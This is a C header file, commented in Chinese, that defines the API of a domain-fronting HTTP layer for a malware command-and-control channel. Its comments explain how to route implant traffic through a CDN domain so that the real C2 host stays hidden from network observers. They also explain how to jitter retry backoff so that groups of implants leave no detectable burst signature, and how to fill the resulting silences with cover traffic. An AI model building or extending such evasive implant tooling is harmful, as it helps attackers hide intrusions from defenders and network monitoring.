/* front.h — 域前置（domain fronting）HTTP 层
 *
 * 原理：外层 TLS 的 SNI 指向前置域（CDN / 大厂域），HTTP 的 Host 头指向真实
 * C2。中间的前置节点按 Host 回源到我们的真实服务端。链路上任何观察者只能
 * 看到与前置域的 TLS 会话，看不到真实目标。
 *
 * 因此两条铁律：
 *  1. SNI 与 Host 是两个独立字段，绝不从同一个字符串推导。
 *     推导出来的两者恒等 —— 前置形同虚设，而且功能上照样连通，
 *     所有"能连上"的测试全绿，唯独前置能力为零。这是最危险的失效模式。
 *  2. 真实目标主机名不得出现在任何加密前的字节里。
 *
 * 本层不做 TLS：TLS 由 25_tls 提供（自研，不依赖 OpenSSL）。
 */
#ifndef FRONT_H
#define FRONT_H

#include <stddef.h>
#include <stdint.h>
#include "tls.h"

typedef enum {
    FRONT_OK = 0,
    FRONT_ERR_ARG,      /* 配置不合法（含 SNI/Host 缺失） */
    FRONT_ERR_MEM,
    FRONT_ERR_IO,
    FRONT_ERR_TLS,      /* 底层 TLS 失败 */
    FRONT_ERR_HTTP,     /* 响应结构非法 / 不支持的编码 */
    FRONT_ERR_RANGE,
    FRONT_ERR_STATE     /* 未连接就收发 */
} front_err;

typedef struct {
    const char *front_domain;   /* 前置域：进 SNI，并用于证书校验（观察者可见） */
    const char *real_host;      /* 真实目标：进 HTTP Host（加密内，观察者不可见） */
    const char *path_prefix;    /* 前置域允许的 URL 前缀，如 "/api/v1/" */
    const char *ca_path;        /* 信任库；NULL 表示不校验 */
    int         verify;         /* 1 = 校验证书链与主机名 */
    uint64_t    rng_seed;       /* 非 0 = 确定性路径抖动（测试用） */
    int         http2;          /* 0 = HTTP/1.1，1 = HTTP/2（h2 需前置域支持） */
} front_config;

typedef struct front_ctx front_ctx;

const char *front_errstr(front_err e);

front_err front_init(front_ctx **out, const front_config *cfg,
                     tls_send_cb send, tls_recv_cb recv, void *arg);
void      front_free(front_ctx *c);

front_err front_connect(front_ctx *c);
front_err front_send(front_ctx *c, const uint8_t *frame, size_t len);
front_err front_recv(front_ctx *c, uint8_t *buf, size_t cap, size_t *out_len);

/* 只构造请求字节、不发送：便于测试断言 SNI/Host 分离与路径抖动，
   也便于调用方自己接管发送（例如走另一条隧道）。 */
front_err front_build_request(front_ctx *c, const uint8_t *frame, size_t len,
                              uint8_t *out, size_t cap, size_t *out_len);

/* 诊断：最近一次请求使用的路径 */
int front_last_path(const front_ctx *c, char *out, size_t cap);

/* 诊断：最近一次响应的状态码（h1 与 h2 一致语义） */
int front_last_status(const front_ctx *c);

/* ---- 自适应退避 ----
 *
 * 退避时长由实测 RTT 导出，不是常数。固定退避有两个后果，都是真实故障：
 *   1. 惊群 —— 一批植入体在 CDN 故障后同时重试，链路上表现为"静默—同步爆发"，
 *      这本身就是可提取的事件特征。故用全抖动（0.5W + rand[0,0.5W)）。
 *   2. 退避造成的静默无人填充 —— 本层不发包，静默就暴露在链路上。
 *      故把应等待的毫秒数暴露给调用方，交给覆盖层（14_p2p cover）去填。
 *
 * 本层只算时长，不 sleep：sleep 会让测试只能靠实时期待，既慢又不可复现。
 */
void     front_note_fail(front_ctx *c);
void     front_note_success(front_ctx *c, uint64_t rtt_us);
uint64_t front_backoff_ms(front_ctx *c);
uint64_t front_rtt_ewma_us(const front_ctx *c);

/* 退避上限（毫秒）：超过即不再加窗，避免链路断了以后永远不重试 */
#define FRONT_BACKOFF_MAX_MS 30000

#endif /* FRONT_H */
